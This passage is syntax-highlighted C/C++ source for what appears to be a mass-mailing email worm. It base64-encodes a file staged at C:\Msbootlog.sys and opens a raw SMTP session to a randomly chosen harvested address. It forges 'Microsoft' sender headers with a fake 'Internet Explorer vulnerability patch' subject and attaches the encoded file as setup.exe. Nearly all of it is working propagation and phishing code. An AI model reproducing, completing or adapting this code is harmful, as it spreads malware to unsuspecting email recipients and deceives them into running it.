</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">(</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc11">getasc</span><span class="sc10">(&amp;</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">)&lt;</span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">-</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc7">'0'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc6">"00"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">done</span><span class="sc10">!=</span><span class="sc4">18</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">done</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">done</span><span class="sc10">+</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc10">+=</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">n</span><span class="sc10">=</span><span class="sc11">strtol</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">lin</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lin</span><span class="sc10">==</span><span class="sc4">76</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc11">lin</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc6">"="</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">g</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc2">//Get the size of the encoded file
</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"C:\\Msbootlog.sys"</span><span class="sc10">,&amp;</span><span class="sc11">fis</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">basesize</span><span class="sc10">=</span><span class="sc11">fis</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//--------------------------------------SENDMAIL---------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">sendmail</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Sends an e-mail with MIME encoding
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ran</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">sending</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//"HELO" the server
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HELO &lt;"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">helo</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc6">"&gt;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">Buf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'2'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]==</span><span class="sc7">'0'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAIL FROM:&lt;"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc6">"&gt;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">Buf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'4'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'2'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]==</span><span class="sc7">'0'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ran</span><span class="sc10">=</span><span class="sc11">rand</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ran</span><span class="sc10">&gt;</span><span class="sc11">c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ran</span><span class="sc10">=</span><span class="sc11">ran</span><span class="sc10">-</span><span class="sc11">rand</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ran</span><span class="sc10">&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ran</span><span class="sc10">=</span><span class="sc11">ran</span><span class="sc10">*(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RCPT TO:&lt;"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">emails</span><span class="sc10">[</span><span class="sc11">ran</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"&gt;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">Buf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'4'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'2'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"DATA\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">Buf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'4'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'3'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]==</span><span class="sc7">'4'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stricmp</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc6">"john@barrysworld.com"</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//if we use the hard-coded e-mail address
</span><span class="sc0">    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Reply-To: \"Microsoft\" &lt;microsoft@microsoft.com&gt;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"From: \"Microsoft\" &lt;information@microsoft.com&gt;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Subject: Internet Explorer vulnerability patch\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//if we find a new address
</span><span class="sc0">    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"From: &lt;"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"&gt;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Subject: Hello\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> 

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MIME-Version: 1.0\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Content-Type: multipart/mixed;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"    boundary = \"bla\"\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"X-Priority: 3\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"X -MSMail - Priority: Normal\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"X-Mailer: mailer@localhost\x0d\x0a\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"This is a multi-part message in MIME format.\x0d\x0a\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"--bla\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Content-Type: text/plain; charset:us-ascii\x0d\x0a\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"You will find all you need in the attachment.\x0d\x0a\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"--bla\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Content-Type: application/x-msdownload;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"    name = \"setup.exe\"\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Content-Transfer-Encoding: base64\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Content-Disposition: attachment;\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"    filename = \"setup.exe\"\x0d\x0a\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//Send the file byte by byte
</span><span class="sc11">fstream</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">(</span><span class="sc6">"C:\\Msbootlog.sys"</span><span class="sc10">,</span><span class="sc11">ios</span><span class="sc10">::</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
